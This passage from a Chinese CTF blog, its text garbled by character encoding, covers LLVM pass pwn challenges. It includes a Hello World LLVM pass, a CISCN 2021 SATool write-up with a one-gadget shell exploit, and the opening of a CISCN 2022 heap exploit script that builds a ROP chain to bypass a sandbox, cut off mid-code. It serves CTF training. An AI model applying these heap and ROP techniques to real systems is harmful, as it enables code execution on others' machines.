make<br></code></pre></td></tr></table></figure><h2 id="åŸºæœ¬æ“ä½œ"><a href="#åŸºæœ¬æ“ä½œ" class="headerlink" title="åŸºæœ¬æ“ä½œ"></a>åŸºæœ¬æ“ä½œ</h2><h3 id="Hello-Pass-ç¼–å†™"><a href="#Hello-Pass-ç¼–å†™" class="headerlink" title="Hello Pass ç¼–å†™"></a>Hello Pass ç¼–å†™</h3><p>éšæ„æ‰¾ä¸€å¤„ä½œä¸ºé¡¹ç›®æ–‡ä»¶å¤¹Helloï¼Œå¹¶ç¼–å†™main.cå¦‚ä¸‹æ‰€ç¤º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">loorain</span><span class="hljs-params">()</span>&#123;&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pwn</span><span class="hljs-params">()</span>&#123;&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello World LLVM PASS&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¼–å†™Hello.cppå¦‚ä¸‹ï¼Œå¦‚ä¸‹ä»£ç å«ä¹‰å¯é˜…è¯»å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://llvm.org/docs/WritingAnLLVMPass.html#introduction-what-is-a-pass">Writing an LLVM Pass â€” LLVM 15.0.0git documentation</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Pass.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/Function.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> llvm;<br><br><span class="hljs-keyword">namespace</span> &#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Hello</span> : <span class="hljs-keyword">public</span> FunctionPass &#123;<br>        <span class="hljs-type">static</span> <span class="hljs-type">char</span> ID;<br>        <span class="hljs-built_in">Hello</span>() : <span class="hljs-built_in">FunctionPass</span>(ID) &#123;&#125;<br>        <br>        <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">runOnFunction</span><span class="hljs-params">(Function &amp;F)</span> <span class="hljs-keyword">override</span> </span>&#123;<br>            <span class="hljs-built_in">errs</span>() &lt;&lt; <span class="hljs-string">&quot;Hello: &quot;</span>;<br>            <span class="hljs-built_in">errs</span>().<span class="hljs-built_in">write_escaped</span>(F.<span class="hljs-built_in">getName</span>()) &lt;&lt; <span class="hljs-string">&#x27;\n&#x27;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<span class="hljs-comment">//éå†æ‰€æœ‰çš„å‡½æ•°åç§°ï¼Œå¹¶ä»¥â€œHelloï¼š&lt;å‡½æ•°å&gt;â€çš„å½¢å¼è¾“å‡º</span><br>    &#125;;<br>&#125;<br><br><span class="hljs-type">char</span> Hello::ID = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//for opt</span><br><span class="hljs-function"><span class="hljs-type">static</span> RegisterPass&lt;Hello&gt; <span class="hljs-title">X</span><span class="hljs-params">(<span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-string">&quot;Hello world Pass&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>)</span></span>;<br><span class="hljs-comment">//for clang</span><br><span class="hljs-function"><span class="hljs-type">static</span> llvm::RegisterStandardPasses <span class="hljs-title">Y</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    llvm::PassManagerBuilder::EP_EarlyAsPossible,</span></span><br><span class="hljs-params"><span class="hljs-function">    [](<span class="hljs-type">const</span> llvm::PassManagerBuilder &amp;Builder,</span></span><br><span class="hljs-params"><span class="hljs-function">       llvm::legacy::PassManagerBase &amp;PM) &#123; PM.add(<span class="hljs-keyword">new</span> Hello()); &#125;)</span></span>;<br></code></pre></td></tr></table></figure><h3 id="å‘½ä»¤è¡Œç¼–è¯‘"><a href="#å‘½ä»¤è¡Œç¼–è¯‘" class="headerlink" title="å‘½ä»¤è¡Œç¼–è¯‘"></a>å‘½ä»¤è¡Œç¼–è¯‘</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ clang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared Hello.cpp -o LLVMHello.so `llvm-config --ldflags`   <br></code></pre></td></tr></table></figure><ul><li><code>llvm-config</code>æä¾›äº†<code>CXXFLAGS</code>ä¸<code>LDFLAGS</code>å‚æ•°æ–¹ä¾¿æŸ¥æ‰¾LLVMçš„å¤´æ–‡ä»¶ä¸åº“æ–‡ä»¶ã€‚ å¦‚æœé“¾æ¥æœ‰é—®é¢˜ï¼Œè¿˜å¯ä»¥ç”¨<code>llvm-config --libs</code>æä¾›åŠ¨æ€é“¾æ¥çš„LLVMåº“ã€‚ å…·ä½“<code>llvm-config</code>æ‰“å°äº†ä»€ä¹ˆï¼Œè¯·è‡ªè¡Œå°è¯•æˆ–æŸ¥æ‰¾å®˜æ–¹æ–‡æ¡£ã€‚</li><li><code>-fPIC -shared</code> æ˜¾ç„¶æ˜¯ç¼–è¯‘åŠ¨æ€åº“çš„å¿…è¦å‚æ•°ã€‚</li><li>å› ä¸ºLLVMæ²¡ç”¨åˆ°RTTIï¼Œæ‰€ä»¥ç”¨<code>-fno-rtti</code> æ¥è®©æˆ‘ä»¬çš„Passä¸ä¹‹ä¸€è‡´ã€‚</li><li><code>-Wl,-znodelete</code>ä¸»è¦æ˜¯ä¸ºäº†åº”å¯¹LLVM 5.0+ä¸­åŠ è½½ModulePasså¼•èµ·segmentation faultçš„bugã€‚å¦‚æœä½ çš„Passç»§æ‰¿äº†ModulePassï¼Œè¿˜è¯·åŠ¡å¿…åŠ ä¸Šã€‚</li></ul><p>ç°åœ¨ï¼Œä½ æ‰‹ä¸­åº”è¯¥æœ‰ä¸€ä»½ç¼–è¯‘å¥½çš„LLVMHello.soäº†ã€‚æ ¹æ®åˆšæ‰é˜…è¯»è¿‡çš„å®˜æ–¹æ–‡æ¡£çš„ä»‹ç»ï¼Œä½ çŸ¥é“å¯ä»¥é€šè¿‡å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ clang -S -emit-llvm main.c -o main.ll<br><span class="hljs-comment">#è¿™é‡Œä¹Ÿå¯ä»¥ä½¿ç”¨&#x27;clang -c -emit-llvm main.c -o main.bc&#x27;åŒºåˆ«åœ¨äºbcæ–‡ä»¶æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶æ— æ³•é˜…è¯»</span><br><span class="hljs-variable">$opt</span> -load LLVMHello.so -hello main.ll -o main<br><span class="hljs-comment">#è¿™é‡Œçš„ -helloç”±Hello.cppä¸­çš„static RegisterPass&lt;Hello&gt; Xå‚æ•°å†³å®š</span><br></code></pre></td></tr></table></figure><blockquote><p>åœ¨ä½¿ç”¨optè¿›è¡ŒåŠ¨æ€é“¾æ¥æ—¶ï¼Œå¯èƒ½ä¼šå‡ºç°é”™è¯¯ï¼šError opening â€˜LLVMHello.soâ€™: LLVMHello.so: cannot open shared object file: No such file or directory</p><p>è¿™å®é™…æ˜¯ç”±äºlinuxä¸­åŠ¨æ€é“¾æ¥åº“çš„å­˜æ”¾åœ°ç‚¹ä¸€èˆ¬æ¯”è¾ƒå›ºå®šï¼Œæ— æ³•åœ¨é»˜è®¤åœ°å€æœç´¢åˆ°åä¸ºLLVMHello.soçš„åŠ¨æ€é“¾æ¥åº“ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åœ¨.bashrcæˆ–.zshrcä¸­åŠ å…¥ä»£è¡¨å½“å‰ç›®å½•çš„åœ°å€ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><p>export LD_LIBRARY_PATH&#x3D;$LD_LIBRARY_PATH:.  </p></blockquote><p><img src="/img/article/llvmCreate/1.png" alt="æ•ˆæœå›¾"></p><p>å¦‚å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬ç¡®å®è¾“å‡ºäº†main.cä¸­æ‰€æœ‰å‡½æ•°åç§°</p><h2 id="ä¾‹é¢˜ä¸€ï¼šCISCN-2021-SATool"><a href="#ä¾‹é¢˜ä¸€ï¼šCISCN-2021-SATool" class="headerlink" title="ä¾‹é¢˜ä¸€ï¼šCISCN 2021 SATool"></a>ä¾‹é¢˜ä¸€ï¼šCISCN 2021 SATool</h2><h3 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h3><p>è¿™ç±»é¢˜ç›®å¯¹æˆ‘ä»¬æœ‰ç”¨çš„éƒ¨åˆ†optå’Œsoæ–‡ä»¶ï¼Œé€†å‘åˆ†æSAPass.soæ–‡ä»¶</p><p><img src="/img/article/llvmCreate/image-20220630204900814.png" alt="image-20220630204900814"></p><p>åœ¨<code>start</code>å‡½æ•°ä¸­ï¼Œä¸»è¦å†…å®¹æ˜¯æ³¨å†Œäº†ä¸€äº›å‡½æ•°ï¼Œæ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ã€‚åœ¨åˆ†æsoæ–‡ä»¶æ—¶ï¼Œä¸€èˆ¬é‡ç‚¹æ˜¯åˆ†æé‡å†™çš„<code>runOnFunction</code>å‡½æ•°ï¼Œæˆ‘ä»¬å¤§å¤šå¯ä»¥åœ¨å‡½æ•°è¡¨çš„æœ€ä¸‹æ–¹æ‰¾åˆ°é‡å†™çš„<code>runOnFunction</code>å‡½æ•°</p><p><img src="/img/article/llvmCreate/image-20220630205306216.png" alt="image-20220630205306216"></p><p>åœ¨è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°<code>sub_19D0</code>å°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„å‡½æ•°ï¼Œåˆ†æå‡½æ•°å†…å®¹ï¼Œè¿™ä¹Ÿæ˜¯åœ¨æˆ‘çœ‹æ¥LLVM PASS ç±»é¢˜ç›®æœ€æ ¸å¿ƒçš„åœ°æ–¹â€”â€”ä»£ç é€†å‘åˆ†æã€‚æ¯•ç«Ÿä¸€ä¸ªå‡½æ•°å°±è¦æ•´æ•´550è¡Œï¼Œèƒ½å¤Ÿå¿«é€Ÿåœ°ç­›é€‰ä»€ä¹ˆæ˜¯å…³é”®ä¿¡æ¯ï¼Œä»€ä¹ˆæ˜¯åƒåœ¾ä¿¡æ¯æ˜¯å…³é”®ã€‚</p><p><img src="/img/article/llvmCreate/image-20220630210526791.png" alt="image-20220630210526791"></p><p>å‡½æ•°ä¸€å¼€å¤´å°±åˆ¤æ–­äº†æˆ‘ä»¬çš„å‡½æ•°åç§°æ˜¯ä¸æ˜¯<code>B4ckDo0r</code>, è¿™é‡Œç”±äºNameçš„ç±»å‹æ˜¯QWORDå­˜å‚¨ï¼Œå¹¶éç›´æ¥å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥è¦åè¿‡æ¥è¯»ã€‚ä¹‹ååˆåˆ†äº†5ä¸ªæ“ä½œåˆ†åˆ«æ˜¯save, takeway, stealkey, fakekey, run.</p><p>åœ¨saveæ“ä½œä¸­ï¼Œè¿›è¡Œäº†å †å—çš„åˆ›å»º</p><p><img src="/img/article/llvmCreate/image-20220630211613541.png" alt="image-20220630211613541"></p><p>åœ¨stealkeyä¸­ï¼Œå°†åˆšåˆšç”³è¯·çš„heapä¸­å†…å®¹ç»™äº†204100ï¼ˆtakewayä¹Ÿæ˜¯è·³è½¬åˆ°äº†stealkeyä¸­ï¼‰</p><p><img src="/img/article/llvmCreate/image-20220630211950647.png" alt="image-20220630211950647"></p><p>åœ¨fakekeyä¸­ï¼Œå°†heapçš„å†…å®¹åŠ ä¸Šäº†å‚æ•°çš„å€¼ï¼Œå³å¯ç¼–è¾‘heapçš„å†…å®¹ï¼ˆè¿™é‡Œçš„heap_conå°±æ˜¯204100ï¼Œæˆ‘æ”¹äº†ä¸ªåå­—ï¼‰</p><p><img src="/img/article/llvmCreate/image-20220630212337680.png" alt="image-20220630212337680"></p><p>runå‡½æ•°ï¼Œå°±æ˜¯ç›´æ¥call *heap</p><p><img src="/img/article/llvmCreate/image-20220630213353185.png" alt="image-20220630213353185"></p><h3 id="GDB-è°ƒè¯•LLVM-PASS"><a href="#GDB-è°ƒè¯•LLVM-PASS" class="headerlink" title="GDB è°ƒè¯•LLVM PASS"></a>GDB è°ƒè¯•LLVM PASS</h3><p>é¦–å…ˆæˆ‘ä»¬ç¼–å†™éƒ¨åˆ†expï¼Œç±»ä¼¼æˆ‘ä»¬åŠ¨æ€åšæ™®é€šçš„PWNé¢˜ç›®ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ clang -S -emit-llvm exp.c -o exp.ll -v<br><span class="hljs-comment">#è¿™é‡ŒåŠ ä¸Š -v å¯ä»¥æ˜¾ç¤ºå‡ºè¯¦ç»†å‚æ•°</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸»è¦é€”ä¸­åœˆçš„è¿™ä¸€éƒ¨åˆ†</p><p><img src="/img/article/llvmCreate/image-20220630221103947.png" alt="image-20220630221103947"></p><blockquote><p>-triple x86_64-pc-linux-gnu -emit-llvm -disable-free -disable-llvm-verifier -discard-value-names -main-file-name exp.c -mrelocation-model static -mthread-model posix -mframe-pointer&#x3D;all -fmath-errno -fno-rounding-math -masm-verbose -mconstructor-aliases -munwind-tables -target-cpu x86-64 -dwarf-column-info -fno-split-dwarf-inlining -debugger-tuning&#x3D;gdb -v -resource-dir &#x2F;usr&#x2F;lib&#x2F;llvm-10&#x2F;lib&#x2F;clang&#x2F;10.0.0 -internal-isystem &#x2F;usr&#x2F;local&#x2F;include -internal-isystem &#x2F;usr&#x2F;lib&#x2F;llvm-10&#x2F;lib&#x2F;clang&#x2F;10.0.0&#x2F;include -internal-externc-isystem &#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu -internal-externc-isystem &#x2F;include -internal-externc-isystem &#x2F;usr&#x2F;include -fdebug-compilation-dir &#x2F;home&#x2F;loorain&#x2F;ciscn&#x2F;CISCN_2021_pwn&#x2F;SATool_é™„ä»¶ -ferror-limit 19 -fmessage-length 0 -fgnuc-version&#x3D;4.2.1 -fobjc-runtime&#x3D;gcc -fdiagnostics-show-option -fcolor-diagnostics -faddrsig -o exp.ll -x c exp.c</p></blockquote><p>åœ¨å¦ä¸€ç»ˆç«¯ä¸­ä½¿ç”¨å¦‚ä¸‹æŒ‡ä»¤,å³å¯å¼€å§‹è°ƒè¯•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gdb clang<br>GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2<br>......<br>......<br>pwndbg&gt; <span class="hljs-built_in">set</span> args -triple x86_64-pc-linux-gnu -emit-llvm -disable-free -disable-llvm-verifier -discard-value-names -main-file-name exp.c -mrelocation-model static -mthread-model posix -mframe-pointer=all -fmath-errno -fno-rounding-math -masm-verbose -mconstructor-aliases -munwind-tables -target-cpu x86-64 -dwarf-column-info -fno-split-dwarf-inlining -debugger-tuning=gdb -v -resource-dir /usr/lib/llvm-10/lib/clang/10.0.0 -internal-isystem /usr/local/include -internal-isystem /usr/lib/llvm-10/lib/clang/10.0.0/include -internal-externc-isystem /usr/include/x86_64-linux-gnu -internal-externc-isystem /include -internal-externc-isystem /usr/include -fdebug-compilation-dir /home/loorain/ciscn/CISCN_2021_pwn/SATool_é™„ä»¶ -ferror-limit 19 -fmessage-length 0 -fgnuc-version=4.2.1 -fobjc-runtime=gcc -fdiagnostics-show-option -fcolor-diagnostics -faddrsig -o exp.ll -x c exp.c<br>pwndbg&gt; b main<br>Breakpoint 1 at 0x40da90<br>pwndbg&gt; n<br>The program is not being run.<br>pwndbg&gt; r<br></code></pre></td></tr></table></figure><h3 id="è§£é¢˜æ€è·¯-amp-EXP"><a href="#è§£é¢˜æ€è·¯-amp-EXP" class="headerlink" title="è§£é¢˜æ€è·¯&amp;EXP"></a>è§£é¢˜æ€è·¯&amp;EXP</h3><ul><li><p>å…ˆç”³è¯·å¤šä¸ªchunkè®²tacheè…¾ç©ºï¼Œä»¥ç”³è¯·unsortbinä¸­çš„chunk</p></li><li><p>åœ¨ç”³è¯·unsortbinæ—¶ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ”¾ç½®â€™\x00â€˜ä»¥æ­¤ä¿ç•™libcä¿¡æ¯</p></li><li><p>åˆ©ç”¨stealkeyå’Œfakekeyå°†chunkä¸­çš„fdæ›´æ”¹ä¸ºonegadget</p></li><li><p>ç„¶ååˆ©ç”¨runç›´æ¥getshell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">save</span><span class="hljs-params">(<span class="hljs-type">char</span> *a1,<span class="hljs-type">char</span> *a2)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">fakekey</span><span class="hljs-params">(int64)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">takeaway</span><span class="hljs-params">(<span class="hljs-type">char</span> *a1)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">stealkey</span><span class="hljs-params">()</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">B4ckDo0r</span><span class="hljs-params">()</span><br>&#123;<br>        save(<span class="hljs-string">&quot;aaaa&quot;</span>,<span class="hljs-string">&quot;aaaa&quot;</span>);<br>        save(<span class="hljs-string">&quot;aaddd&quot;</span>,<span class="hljs-string">&quot;aadd&quot;</span>);<br>        save(<span class="hljs-string">&quot;ssss&quot;</span>,<span class="hljs-string">&quot;sss&quot;</span>);<br>        save(<span class="hljs-string">&quot;ssss&quot;</span>,<span class="hljs-string">&quot;sssss&quot;</span>);<br>        save(<span class="hljs-string">&quot;sssss&quot;</span>,<span class="hljs-string">&quot;sssss&quot;</span>);<br>        save(<span class="hljs-string">&quot;sssss&quot;</span>,<span class="hljs-string">&quot;sssss&quot;</span>);<br>    save(<span class="hljs-string">&quot;sssss&quot;</span>,<span class="hljs-string">&quot;sssss&quot;</span>);<br>        save(<span class="hljs-string">&quot;\x00&quot;</span>,<span class="hljs-string">&quot;ssssss&quot;</span>);<br>        stealkey();<br>        fakekey(<span class="hljs-number">-0x2E19b4</span>);<br>        run();<br> <br>&#125;<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€CISCN2022ã€‘ ä¸œåŒ—èµ›åŒºåˆ†åŒºèµ›PWN WriteUP</title>
    <link href="/2022/06/21/CISCN%202022/"/>
    <url>/2022/06/21/CISCN%202022/</url>
    
    <content type="html"><![CDATA[<h2 id="soil3-amp-mountain1"><a href="#soil3-amp-mountain1" class="headerlink" title="soil3 &amp; mountain1"></a>soil3 &amp; mountain1</h2><ul><li>é¦–å…ˆæ ¹æ®unsorted bin æ³„éœ²å‡ºlibc</li><li>ç„¶åæ ¹æ®libc_base å’Œ <code>libc.bss()</code>å‡½æ•°æ³„éœ²æ ˆåœ°å€</li><li>åˆ©ç”¨orw ROPè¦†ç›–retè¿”å›åœ°å€ï¼Œå¹¶ç»•è¿‡æ²™ç›’æœºåˆ¶</li><li>soil3 é¢˜ç›®ï¼Œå”¯ä¸€çš„åŒºåˆ«å°±æ˜¯æ²¡æœ‰æ²™ç›’ï¼ŒåŸmountainé¢˜ç›®çš„EXPå³å¯é€šè¿‡</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment"># io = remote(&#x27;172.16.30.186&#x27;,58012)</span><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice:&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Please input size:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(size))<br>    io.recvuntil(<span class="hljs-string">&#x27;Please input content:&#x27;</span>)<br>    io.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice:&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Please input idx:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice:&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Please input idx:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice:&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Please input idx:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br>    <span class="hljs-keyword">if</span> idx&lt;=<span class="hljs-number">32</span>:<br>        io.recvuntil(<span class="hljs-string">&#x27;Please input content:&#x27;</span>)<br>        io.send(content)<br><br><br>add(<span class="hljs-number">0x430</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x430</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># pause()</span><br>show(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># io.recvline()</span><br><span class="hljs-comment"># pause()</span><br>libc_base = u64(io.recvuntil(<span class="hljs-string">&#x27;Done&#x27;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">4</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - libc.symbols[<span class="hljs-string">&#x27;main_arena&#x27;</span>] - <span class="hljs-number">96</span><br>success(<span class="hljs-string">&#x27;libc_base --&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>bss_addr = libc_base + libc.bss()<br>success(<span class="hljs-string">&#x27;bss --&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(bss_addr))<br>flag_addr = bss_addr + <span class="hljs-number">0x200</span><br><span class="hljs-comment"># edit(32,&#x27;&#x27;)</span><br><br>pop_rdi = libc_base +<span class="hljs-number">0x000000000002daa2</span> <span class="hljs-comment">#: pop rdi ; ret</span><br>pop_rsi = libc_base + <span class="hljs-number">0x0000000000037bfa</span><span class="hljs-comment"># : pop rsi ; ret</span><br>pop_rdx = libc_base + <span class="hljs-number">0x0000000000106791</span><span class="hljs-comment"># : pop rdx ; pop r12 ; ret</span><br>pop_rax = libc_base + <span class="hljs-number">0x00000000000446b0</span><span class="hljs-comment"># : pop rax ; ret</span><br>open_addr 